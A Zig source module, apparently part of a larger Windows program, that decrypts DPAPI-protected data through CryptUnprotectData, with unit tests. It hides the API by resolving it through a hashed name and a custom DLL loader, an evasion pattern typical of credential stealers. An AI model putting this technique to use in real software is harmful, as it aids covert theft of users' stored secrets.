const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const export_resolve = @import("../types/export_resolve.zig");
const dll_loader = @import("dll_loader.zig");

const CRYPTOAPI_BLOB = extern struct {
    cbData: types.ULONG,
    pbData: types.PVOID,
};

const CryptUnprotectData_fn = *const fn (
    pDataIn: *const CRYPTOAPI_BLOB,
    ppszDataDescr: ?*?*u16,
    pOptionalEntropy: ?*const CRYPTOAPI_BLOB,
    pvReserved: ?*const anyopaque,
    pPromptStruct: ?*const anyopaque,
    dwFlags: types.ULONG,
    pDataOut: *CRYPTOAPI_BLOB,
) callconv(.c) types.BOOL;

const CRYPTPROTECT_UI_FORBIDDEN: types.ULONG = 0x01;

var crypt_unprotect_data: ?CryptUnprotectData_fn = null;

fn ensureInit() bool {
    if (crypt_unprotect_data != null) return true;
    const base = dll_loader.getOrLoadDll("crypt32.dll") orelse return false;
    crypt_unprotect_data = @ptrCast(@alignCast(
        export_resolve.getFunctionByHash(base, hash.encryptedHashFunc("CryptUnprotectData")) orelse return false,
    ));
    return true;
}

pub fn decrypt(input: []const u8) ?[]u8 {
    if (!ensureInit()) return null;
    if (input.len == 0 or input.len > 1024 * 1024) return null;

    var blob_in = CRYPTOAPI_BLOB{
        .cbData = @as(types.ULONG, @intCast(input.len)),
        .pbData = @as(types.PVOID, @constCast(@as(*const anyopaque, @ptrCast(input.ptr)))),
    };

    var blob_out: CRYPTOAPI_BLOB = undefined;
    const ret = crypt_unprotect_data.?(
        &blob_in,
        null,
        null,
        null,
        null,
        CRYPTPROTECT_UI_FORBIDDEN,
        &blob_out,
    );

    if (ret == 0) return null;

    const result = @as([*]u8, @ptrCast(blob_out.pbData))[0..blob_out.cbData];
    return result;
}

// ── Tests ──

const testing = std.testing;

test "decrypt empty input" {
    try testing.expect(decrypt("") == null);
}

test "decrypt too large input" {
    var big: [1024 * 1024 + 1]u8 = undefined;
    try testing.expect(decrypt(&big) == null);
}

test "decrypt invalid blob (expected fail)" {
    const blob = [_]u8{0x01, 0x00, 0x00, 0x00} ++ [_]u8{0x00} ** 20;
    try testing.expect(decrypt(&blob) == null);
}
